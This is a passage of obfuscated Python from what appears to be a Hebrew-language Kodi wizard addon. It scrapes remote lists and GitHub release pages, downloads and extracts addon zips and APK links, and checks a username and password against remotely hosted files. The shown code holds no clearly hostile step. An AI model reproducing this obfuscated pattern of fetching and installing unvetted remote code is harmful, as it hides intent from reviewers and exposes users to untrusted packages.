					O0OOOO0O00OO0OOO0 =O00OO00O00O00O0OO [2 ]#line:2783
					O0OOOO0O000O00000 =''#line:2784
				OOOOOOO0O00OO00OO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO00O00O00O0OO [0 ].title (),O00OO00O00O00O0OO [1 ],O0OOOO0O000O00000 .upper (),O0OOOO0O00OO0OOO0 ,COLOR2 ,O000O00000O0OO00O .replace (' ',''),COLOR1 ,O000000O0000OOO0O )#line:2785
				O0O00O0OO00O0000O =urljoin (O0OO000O0O00O0OOO ,OO0OOO0OOOO00O000 )#line:2786
				addFile (OOOOOOO0O00OO00OO ,'apkinstall',"%s v%s%s %s"%(O00OO00O00O00O0OO [0 ].title (),O00OO00O00O00O0OO [1 ],O0OOOO0O000O00000 .upper (),O0OOOO0O00OO0OOO0 ),O0O00O0OO00O0000O )#line:2787
				OO000000OO0OO0OO0 +=1 #line:2788
			except :#line:2789
				wiz .log ("Error on: %s"%name )#line:2790
		for OO0OOO0OOOO00O000 ,name ,O000O00000O0OO00O ,O000000O0000OOO0O in O0O00OO00O0O00O0O :#line:2792
			if OO0OOO0OOOO00O000 in ['../','old/']:continue #line:2793
			if not OO0OOO0OOOO00O000 .endswith ('.apk'):continue #line:2794
			if not OO0OOO0OOOO00O000 .find ('_')==-1 :continue #line:2795
			try :#line:2796
				O00OO00O00O00O0OO =name .split ('-')#line:2797
				OOOOOOO0O00OO00OO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO00O00O00O0OO [0 ].title (),O00OO00O00O00O0OO [1 ],O00OO00O00O00O0OO [2 ],COLOR2 ,O000O00000O0OO00O .replace (' ',''),COLOR1 ,O000000O0000OOO0O )#line:2798
				O0O00O0OO00O0000O =urljoin (O00O0O00000OOOO00 ,OO0OOO0OOOO00O000 )#line:2799
				addFile (OOOOOOO0O00OO00OO ,'apkinstall',"%s v%s %s"%(O00OO00O00O00O0OO [0 ].title (),O00OO00O00O00O0OO [1 ],O00OO00O00O00O0OO [2 ]),O0O00O0OO00O0000O )#line:2800
				OO000000OO0OO0OO0 +=1 #line:2801
			except :#line:2802
				wiz .log ("Error on: %s"%name )#line:2803
		if OO000000OO0OO0OO0 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2804
	elif name =='spmc':#line:2805
		O000O000O00O00000 ='https://github.com/koying/SPMC/releases'#line:2806
		O000000O0OO0O00O0 =wiz .openURL (O000O000O00O00000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2807
		OO000000OO0OO0OO0 =0 #line:2808
		OOO0000000000O0O0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O000000O0OO0O00O0 )#line:2809
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2811
		for name ,OO000OOO000O00OO0 in OOO0000000000O0O0 :#line:2813
			OOO00OOO0OO0O0000 =''#line:2814
			O0O00OO00O0O00O0O =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OO000OOO000O00OO0 )#line:2815
			for O00OOOO000OOOO0OO ,OO0O0O00000OO0OOO ,OOOOO0000OO00OO0O in O0O00OO00O0O00O0O :#line:2816
				if OOOOO0000OO00OO0O .find ('armeabi')==-1 :continue #line:2817
				if OOOOO0000OO00OO0O .find ('launcher')>-1 :continue #line:2818
				OOO00OOO0OO0O0000 =urljoin ('https://github.com',O00OOOO000OOOO0OO )#line:2819
				break #line:2820
		if OO000000OO0OO0OO0 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2822
def apkMenu (url =None ):#line:2824
	if url ==None :#line:2825
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2828
	if not APKFILE =='http://':#line:2829
		if url ==None :#line:2830
			O0OOO0OOO0000O0OO =wiz .workingURL (APKFILE )#line:2831
			OOOO000O000O0OO0O =uservar .APKFILE #line:2832
		else :#line:2833
			O0OOO0OOO0000O0OO =wiz .workingURL (url )#line:2834
			OOOO000O000O0OO0O =url #line:2835
		if O0OOO0OOO0000O0OO ==True :#line:2836
			O000O0O00O0OO0OOO =wiz .openURL (OOOO000O000O0OO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2837
			OOOOO0O0O000OOOO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000O0O00O0OO0OOO )#line:2838
			if len (OOOOO0O0O000OOOO0 )>0 :#line:2839
				OO00O0OO0O0O000O0 =0 #line:2840
				for O00OO0000OOO00000 ,O0O0OOO0O0000OOOO ,url ,O00O0O000O0OO0OOO ,OOOO0O00OOO00OO0O ,OO0OO0O00O0O00O00 ,O00O00O00000O000O in OOOOO0O0O000OOOO0 :#line:2841
					if not SHOWADULT =='true'and OO0OO0O00O0O00O00 .lower ()=='yes':continue #line:2842
					if O0O0OOO0O0000OOOO .lower ()=='yes':#line:2843
						OO00O0OO0O0O000O0 +=1 #line:2844
						addDir ("[B]%s[/B]"%O00OO0000OOO00000 ,'apk',url ,description =O00O00O00000O000O ,icon =O00O0O000O0OO0OOO ,fanart =OOOO0O00OOO00OO0O ,themeit =THEME3 )#line:2845
					else :#line:2846
						OO00O0OO0O0O000O0 +=1 #line:2847
						addFile (O00OO0000OOO00000 ,'apkinstall',O00OO0000OOO00000 ,url ,description =O00O00O00000O000O ,icon =O00O0O000O0OO0OOO ,fanart =OOOO0O00OOO00OO0O ,themeit =THEME2 )#line:2848
					if OO00O0OO0O0O000O0 <1 :#line:2849
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2850
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2851
		else :#line:2852
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2853
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2854
			addFile ('%s'%O0OOO0OOO0000O0OO ,'',themeit =THEME3 )#line:2855
		return #line:2856
	else :wiz .log ("[APK Menu] No APK list added.")#line:2857
	setView ('files','viewType')#line:2858
def addonMenu (url =None ):#line:2860
	if not ADDONFILE =='http://':#line:2861
		if url ==None :#line:2862
			OOO0OO00O0OO00OOO =wiz .workingURL (ADDONFILE )#line:2863
			O00O00000OO0OOO0O =uservar .ADDONFILE #line:2864
		else :#line:2865
			OOO0OO00O0OO00OOO =wiz .workingURL (url )#line:2866
			O00O00000OO0OOO0O =url #line:2867
		if OOO0OO00O0OO00OOO ==True :#line:2868
			O0O0OOOOOO0000000 =wiz .openURL (O00O00000OO0OOO0O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2869
			O00O00OO0OOO0O00O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0OOOOOO0000000 )#line:2870
			if len (O00O00OO0OOO0O00O )>0 :#line:2871
				OOOO0O0OOOO0O0O00 =0 #line:2872
				for O0OO0O000O0OOOOO0 ,OOO00OO0000O00O0O ,url ,O0O0OOO00OO00O00O ,OO0OO0OO000O00O00 ,OO0OO00O000O000O0 ,O0000O00O0OO0O00O ,OO00O0000O0O000O0 ,O0O0OO0O0O0OO0O0O ,O00OOO0O0OOO0OO00 in O00O00OO0OOO0O00O :#line:2873
					if OOO00OO0000O00O0O .lower ()=='section':#line:2874
						OOOO0O0OOOO0O0O00 +=1 #line:2875
						addDir ("[B]%s[/B]"%O0OO0O000O0OOOOO0 ,'addons',url ,description =O00OOO0O0OOO0OO00 ,icon =O0000O00O0OO0O00O ,fanart =OO00O0000O0O000O0 ,themeit =THEME3 )#line:2876
					else :#line:2877
						if not SHOWADULT =='true'and O0O0OO0O0O0OO0O0O .lower ()=='yes':continue #line:2878
						try :#line:2879
							OO00OOOOOOO0OOOO0 =xbmcaddon .Addon (id =OOO00OO0000O00O0O ).getAddonInfo ('path')#line:2880
							if os .path .exists (OO00OOOOOOO0OOOO0 ):#line:2881
								O0OO0O000O0OOOOO0 ="[COLOR green][Installed][/COLOR] %s"%O0OO0O000O0OOOOO0 #line:2882
						except :#line:2883
							pass #line:2884
						OOOO0O0OOOO0O0O00 +=1 #line:2885
						addFile (O0OO0O000O0OOOOO0 ,'addoninstall',OOO00OO0000O00O0O ,O00O00000OO0OOO0O ,description =O00OOO0O0OOO0OO00 ,icon =O0000O00O0OO0O00O ,fanart =OO00O0000O0O000O0 ,themeit =THEME2 )#line:2886
					if OOOO0O0OOOO0O0O00 <1 :#line:2887
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2888
			else :#line:2889
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2890
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2891
		else :#line:2892
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2893
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2894
			addFile ('%s'%OOO0OO00O0OO00OOO ,'',themeit =THEME3 )#line:2895
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2896
	setView ('files','viewType')#line:2897
def addonInstaller (O0O00OO0OO00OOO00 ,OOOO00OO000000OO0 ):#line:2899
	if not ADDONFILE =='http://':#line:2900
		OO0000O00OO00OO00 =wiz .workingURL (OOOO00OO000000OO0 )#line:2901
		if OO0000O00OO00OO00 ==True :#line:2902
			OO0OO000O0OOOO0O0 =wiz .openURL (OOOO00OO000000OO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2903
			O000O0OOO0O0OOOO0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O00OO0OO00OOO00 ).findall (OO0OO000O0OOOO0O0 )#line:2904
			if len (O000O0OOO0O0OOOO0 )>0 :#line:2905
				for OO0OO0OOO00OO000O ,OOOO00OO000000OO0 ,O00OOO0OO00OO0OO0 ,OOO0O00O0O0OO00OO ,O00000O0OO000OOOO ,OO0O0O0O00000000O ,OO00OOO00O00OO0O0 ,O0OO000OOOO00OOO0 ,OOO0OOO0OOO00OO0O in O000O0OOO0O0OOOO0 :#line:2906
					if os .path .exists (os .path .join (ADDONS ,O0O00OO0OO00OOO00 )):#line:2907
						OO000OO0OO0OOOO0O =['Launch Addon','Remove Addon']#line:2908
						OO00OOOOO00OO00OO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO000OO0OO0OOOO0O )#line:2909
						if OO00OOOOO00OO00OO ==0 :#line:2910
							wiz .ebi ('RunAddon(%s)'%O0O00OO0OO00OOO00 )#line:2911
							xbmc .sleep (1000 )#line:2912
							return True #line:2913
						elif OO00OOOOO00OO00OO ==1 :#line:2914
							wiz .cleanHouse (os .path .join (ADDONS ,O0O00OO0OO00OOO00 ))#line:2915
							try :wiz .removeFolder (os .path .join (ADDONS ,O0O00OO0OO00OOO00 ))#line:2916
							except :pass #line:2917
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0O00OO0OO00OOO00 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2918
								removeAddonData (O0O00OO0OO00OOO00 )#line:2919
							wiz .refresh ()#line:2920
							return True #line:2921
						else :#line:2922
							return False #line:2923
					OO0OO0OO000OOO00O =os .path .join (ADDONS ,O00OOO0OO00OO0OO0 )#line:2924
					if not O00OOO0OO00OO0OO0 .lower ()=='none'and not os .path .exists (OO0OO0OO000OOO00O ):#line:2925
						wiz .log ("Repository not installed, installing it")#line:2926
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O0O00OO0OO00OOO00 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00OOO0OO00OO0OO0 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2927
							OOO00000O0O0O00OO =wiz .parseDOM (wiz .openURL (OOO0O00O0O0OO00OO ),'addon',ret ='version',attrs ={'id':O00OOO0OO00OO0OO0 })#line:2928
							if len (OOO00000O0O0O00OO )>0 :#line:2929
								OOO0OOO0O0OOOOOO0 ='%s%s-%s.zip'%(O00000O0OO000OOOO ,O00OOO0OO00OO0OO0 ,OOO00000O0O0O00OO [0 ])#line:2930
								wiz .log (OOO0OOO0O0OOOOOO0 )#line:2931
								if KODIV >=17 :wiz .addonDatabase (O00OOO0OO00OO0OO0 ,1 )#line:2932
								installAddon (O00OOO0OO00OO0OO0 ,OOO0OOO0O0OOOOOO0 )#line:2933
								wiz .ebi ('UpdateAddonRepos()')#line:2934
								wiz .log ("Installing Addon from Kodi")#line:2936
								O00O0OO0O00OOO0O0 =installFromKodi (O0O00OO0OO00OOO00 )#line:2937
								wiz .log ("Install from Kodi: %s"%O00O0OO0O00OOO0O0 )#line:2938
								if O00O0OO0O00OOO0O0 :#line:2939
									wiz .refresh ()#line:2940
									return True #line:2941
							else :#line:2942
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O00OOO0OO00OO0OO0 )#line:2943
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O0O00OO0OO00OOO00 ,O00OOO0OO00OO0OO0 ))#line:2944
					elif O00OOO0OO00OO0OO0 .lower ()=='none':#line:2945
						wiz .log ("No repository, installing addon")#line:2946
						O0O0OOO0OO000O00O =O0O00OO0OO00OOO00 #line:2947
						OOO0OOOO0OO0000O0 =OOOO00OO000000OO0 #line:2948
						installAddon (O0O00OO0OO00OOO00 ,OOOO00OO000000OO0 )#line:2949
						wiz .refresh ()#line:2950
						return True #line:2951
					else :#line:2952
						wiz .log ("Repository installed, installing addon")#line:2953
						O00O0OO0O00OOO0O0 =installFromKodi (O0O00OO0OO00OOO00 ,False )#line:2954
						if O00O0OO0O00OOO0O0 :#line:2955
							wiz .refresh ()#line:2956
							return True #line:2957
					if os .path .exists (os .path .join (ADDONS ,O0O00OO0OO00OOO00 )):return True #line:2958
					O00OO0000OOOOO000 =wiz .parseDOM (wiz .openURL (OOO0O00O0O0OO00OO ),'addon',ret ='version',attrs ={'id':O0O00OO0OO00OOO00 })#line:2959
					if len (O00OO0000OOOOO000 )>0 :#line:2960
						OOOO00OO000000OO0 ="%s%s-%s.zip"%(OOOO00OO000000OO0 ,O0O00OO0OO00OOO00 ,O00OO0000OOOOO000 [0 ])#line:2961
						wiz .log (str (OOOO00OO000000OO0 ))#line:2962
						if KODIV >=17 :wiz .addonDatabase (O0O00OO0OO00OOO00 ,1 )#line:2963
						installAddon (O0O00OO0OO00OOO00 ,OOOO00OO000000OO0 )#line:2964
						wiz .refresh ()#line:2965
					else :#line:2966
						wiz .log ("no match");return False #line:2967
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2968
		else :wiz .log ("[Addon Installer] Text File: %s"%OO0000O00OO00OO00 )#line:2969
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2970
def installFromKodi (O0O00OOOOO0O000OO ,over =True ):#line:2972
	if over ==True :#line:2973
		xbmc .sleep (2000 )#line:2974
	wiz .ebi ('RunPlugin(plugin://%s)'%O0O00OOOOO0O000OO )#line:2976
	if not wiz .whileWindow ('yesnodialog'):#line:2977
		return False #line:2978
	xbmc .sleep (1000 )#line:2979
	if wiz .whileWindow ('okdialog'):#line:2980
		return False #line:2981
	wiz .whileWindow ('progressdialog')#line:2982
	if os .path .exists (os .path .join (ADDONS ,O0O00OOOOO0O000OO )):return True #line:2983
	else :return False #line:2984
def installAddon (O0OOO00OO0OOO00OO ,OOO00O00O000OOO0O ):#line:2986
	if not wiz .workingURL (OOO00O00O000OOO0O )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0OOO00OO0OOO00OO ,COLOR2 ));return #line:2987
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2988
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO00OO0OOO00OO ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2989
	O0OO0OOOOOO0O00O0 =OOO00O00O000OOO0O .split ('/')#line:2990
	OO0000OOOO00O00OO =os .path .join (PACKAGES ,O0OO0OOOOOO0O00O0 [-1 ])#line:2991
	try :os .remove (OO0000OOOO00O00OO )#line:2992
	except :pass #line:2993
	downloader .download (OOO00O00O000OOO0O ,OO0000OOOO00O00OO ,DP )#line:2994
	O0O0OO0OO00O00O00 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO00OO0OOO00OO )#line:2995
	DP .update (0 ,O0O0OO0OO00O00O00 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2996
	O0000O0OOO00O0OO0 ,OOOO0OOO00OOOO0OO ,OO0O0OO0OOO0O0O00 =extract .all (OO0000OOOO00O00OO ,ADDONS ,DP ,title =O0O0OO0OO00O00O00 )#line:2997
	DP .update (0 ,O0O0OO0OO00O00O00 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2998
	installed (O0OOO00OO0OOO00OO )#line:2999
	installDep (O0OOO00OO0OOO00OO ,DP )#line:3000
	DP .close ()#line:3001
	wiz .ebi ('UpdateAddonRepos()')#line:3002
	wiz .ebi ('UpdateLocalAddons()')#line:3003
	wiz .refresh ()#line:3004
def installDep (OOO000OOO00O0OO00 ,DP =None ):#line:3006
	OO0O00O0OOO0OOO0O =os .path .join (ADDONS ,OOO000OOO00O0OO00 ,'addon.xml')#line:3007
	if os .path .exists (OO0O00O0OOO0OOO0O ):#line:3008
		OOO0O00OO00O00OOO =open (OO0O00O0OOO0OOO0O ,mode ='r');O0000OO00OOO0000O =OOO0O00OO00O00OOO .read ();OOO0O00OO00O00OOO .close ();#line:3009
		OOO0O000000OOOO00 =wiz .parseDOM (O0000OO00OOO0000O ,'import',ret ='addon')#line:3010
		for O0OO0OO000O0OO00O in OOO0O000000OOOO00 :#line:3011
			if not 'xbmc.python'in O0OO0OO000O0OO00O :#line:3012
				if not DP ==None :#line:3013
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO0OO000O0OO00O ))#line:3014
				wiz .createTemp (O0OO0OO000O0OO00O )#line:3015
def installed (O0O0O0O0OOOO000OO ):#line:3042
	OO0O0O0OO0O00OO00 =os .path .join (ADDONS ,O0O0O0O0OOOO000OO ,'addon.xml')#line:3043
	if os .path .exists (OO0O0O0OO0O00OO00 ):#line:3044
		try :#line:3045
			OOO0OO00OO00OO0O0 =open (OO0O0O0OO0O00OO00 ,mode ='r');O0000O0OOOOO0OO00 =OOO0OO00OO00OO0O0 .read ();OOO0OO00OO00OO0O0 .close ()#line:3046
			OOO00000O0OOO000O =wiz .parseDOM (O0000O0OOOOO0OO00 ,'addon',ret ='name',attrs ={'id':O0O0O0O0OOOO000OO })#line:3047
			OO00OO0O00000O0OO =os .path .join (ADDONS ,O0O0O0O0OOOO000OO ,'icon.png')#line:3048
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO00000O0OOO000O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO00OO0O00000O0OO )#line:3049
		except :pass #line:3050
def youtubeMenu (url =None ):#line:3052
	if not YOUTUBEFILE =='http://':#line:3053
		if url ==None :#line:3054
			OO00OO0O0O000O0OO =wiz .workingURL (YOUTUBEFILE )#line:3055
			OO0OOOOO0O00OO000 =uservar .YOUTUBEFILE #line:3056
		else :#line:3057
			OO00OO0O0O000O0OO =wiz .workingURL (url )#line:3058
			OO0OOOOO0O00OO000 =url #line:3059
		if OO00OO0O0O000O0OO ==True :#line:3060
			O0OOOOO0OOO00O000 =wiz .openURL (OO0OOOOO0O00OO000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3061
			OOO0O0O00OOOO000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OOOOO0OOO00O000 )#line:3062
			if len (OOO0O0O00OOOO000O )>0 :#line:3063
				for OOO0OO0O00OO0OOO0 ,OOOO000O00000000O ,url ,O0OOO0OO00OOOOOOO ,O00O0000OOOO0O0O0 ,O0OO0O0O0O000O000 in OOO0O0O00OOOO000O :#line:3064
					if OOOO000O00000000O .lower ()=="yes":#line:3065
						addDir ("[B]%s[/B]"%OOO0OO0O00OO0OOO0 ,'youtube',url ,description =O0OO0O0O0O000O000 ,icon =O0OOO0OO00OOOOOOO ,fanart =O00O0000OOOO0O0O0 ,themeit =THEME3 )#line:3066
					else :#line:3067
						addFile (OOO0OO0O00OO0OOO0 ,'viewVideo',url =url ,description =O0OO0O0O0O000O000 ,icon =O0OOO0OO00OOOOOOO ,fanart =O00O0000OOOO0O0O0 ,themeit =THEME2 )#line:3068
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:3069
		else :#line:3070
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:3071
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:3072
			addFile ('%s'%OO00OO0O0O000O0OO ,'',themeit =THEME3 )#line:3073
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:3074
	setView ('files','viewType')#line:3075
def STARTP ():#line:3076
	OO00OO0O00O0OOOOO =(ADDON .getSetting ("pass"))#line:3077
	if BUILDNAME =="":#line:3078
	 if not NOTIFY =='true':#line:3079
          O0OO0O00O0O000OOO =wiz .workingURL (NOTIFICATION )#line:3080
	 if not NOTIFY2 =='true':#line:3081
          O0OO0O00O0O000OOO =wiz .workingURL (NOTIFICATION2 )#line:3082
	 if not NOTIFY3 =='true':#line:3083
          O0OO0O00O0O000OOO =wiz .workingURL (NOTIFICATION3 )#line:3084
	O00O0OO0OOO000000 =OO00OO0O00O0OOOOO #line:3085
	O0OO0O00O0O000OOO =urllib2 .Request (SPEED )#line:3086
	O0OO0000OO00O00O0 =urllib2 .urlopen (O0OO0O00O0O000OOO )#line:3087
	O00OOO000O0000O0O =O0OO0000OO00O00O0 .readlines ()#line:3089
	OOO0O00OOO0O0OO00 =0 #line:3093
	for O0O0O0000OO00OOO0 in O00OOO000O0000O0O :#line:3094
		if O0O0O0000OO00OOO0 .split (' ==')[0 ]==OO00OO0O00O0OOOOO or O0O0O0000OO00OOO0 .split ()[0 ]==OO00OO0O00O0OOOOO :#line:3095
			OOO0O00OOO0O0OO00 =1 #line:3096
			break #line:3097
	if OOO0O00OOO0O0OO00 ==0 :#line:3098
					OO000O0OOOO00O000 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3099
					if OO000O0OOOO00O000 :#line:3101
						ADDON .openSettings ()#line:3103
						sys .exit ()#line:3105
					else :#line:3106
						sys .exit ()#line:3107
	return 'ok'#line:3111
def STARTP2 ():#line:3112
	O0OOOOO00OOO0OOOO =(ADDON .getSetting ("user"))#line:3113
	O000OO0O000O0O0OO =(UNAME )#line:3115
	O00O0OOOOO000OOO0 =urllib2 .urlopen (O000OO0O000O0O0OO )#line:3116
	O00OOOOOOOOO00OO0 =O00O0OOOOO000OOO0 .readlines ()#line:3117
	OO0OO0O00O0000OO0 =0 #line:3118
	for O0OO0OO000O00O0O0 in O00OOOOOOOOO00OO0 :#line:3121
		if O0OO0OO000O00O0O0 .split (' ==')[0 ]==O0OOOOO00OOO0OOOO or O0OO0OO000O00O0O0 .split ()[0 ]==O0OOOOO00OOO0OOOO :#line:3122
			OO0OO0O00O0000OO0 =1 #line:3123
			break #line:3124
	if OO0OO0O00O0000OO0 ==0 :#line:3125
		OO0O0OO000O0000O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3126
		if OO0O0OO000O0000O0 :#line:3128
			ADDON .openSettings ()#line:3130
			sys .exit ()#line:3133
		else :#line:3134
			sys .exit ()#line:3135
	return 'ok'#line:3139
def passandpin ():#line:3140
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:3141
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:3142
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:3143
def passandUsername ():#line:3144
	ADDON .openSettings ()#line:3146
def folderback ():#line:3149
    OO000O00000O0OOO0 =ADDON .getSetting ("path")#line:3150
    if OO000O00000O0OOO0 :#line:3151
      OO000O00000O0OOO0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:3152
      ADDON .setSetting ("path",OO000O00000O0OOO0 )#line:3153
def backmyupbuild ():#line:3156
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3160
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3161
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3162
		addFile ('גיבוי הגדרות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3165
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3166
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3168
def maintMenu (view =None ):#line:3172
	O00OO0O000O000OOO ='[B][COLOR green]ON[/COLOR][/B]';O000OO000O000OO00 ='[B][COLOR red]OFF[/COLOR][/B]'#line:3174
	OO000OOOOO00OO000 ='true'if AUTOCLEANUP =='true'else 'false'#line:3175
	OO00OOO00OO0000O0 ='true'if AUTOCACHE =='true'else 'false'#line:3176
	OO00O00OO0OOOO0OO ='true'if AUTOPACKAGES =='true'else 'false'#line:3177
	O0OOO0O000O000O0O ='true'if AUTOTHUMBS =='true'else 'false'#line:3178
	O0000OO0O00000000 ='true'if SHOWMAINT =='true'else 'false'#line:3179
	O0O00OO0O0O000OOO ='true'if INCLUDEVIDEO =='true'else 'false'#line:3180
	OO00OO0OOOOOOOO00 ='true'if INCLUDEALL =='true'else 'false'#line:3181
	OOO0O00OO00OO0O00 ='true'if THIRDPARTY =='true'else 'false'#line:3182
	if wiz .Grab_Log (True )==False :OOO0O0OO00O000O00 =0 #line:3183
	else :OOO0O0OO00O000O00 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:3184
	if wiz .Grab_Log (True ,True )==False :O000O00OO0OO00OOO =0 #line:3185
	else :O000O00OO0OO00OOO =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:3186
	OO0OO0OO0OO0O0O00 =int (OOO0O0OO00O000O00 )+int (O000O00OO0OO00OOO )#line:3187
	O0O0OO0OO00OOO0OO =str (OO0OO0OO0OO0O0O00 )+' Error(s) Found'if OO0OO0OO0OO0O0O00 >0 else 'None Found'#line:3188
	O0000OOOO0O0O0OO0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:3189
	if OO00OO0OOOOOOOO00 =='true':#line:3190
		O0O00O00OO000OO0O ='true'#line:3191
		O000OOO0000000O0O ='true'#line:3192
		O000O0OOO0OOOO00O ='true'#line:3193
		OOOO0O000OOOOO0OO ='true'#line:3194
		O00OO0O0OO0OO0OO0 ='true'#line:3195
		O00000O0OO0OOOO0O ='true'#line:3196
		OOOO0O0O000O0000O ='true'#line:3197
		OOO00O00O00O00OO0 ='true'#line:3198
	else :#line:3199
		O0O00O00OO000OO0O ='true'if INCLUDEBOB =='true'else 'false'#line:3200
		O000OOO0000000O0O ='true'if INCLUDEPHOENIX =='true'else 'false'#line:3201
		O000O0OOO0OOOO00O ='true'if INCLUDESPECTO =='true'else 'false'#line:3202
		OOOO0O000OOOOO0OO ='true'if INCLUDEGENESIS =='true'else 'false'#line:3203
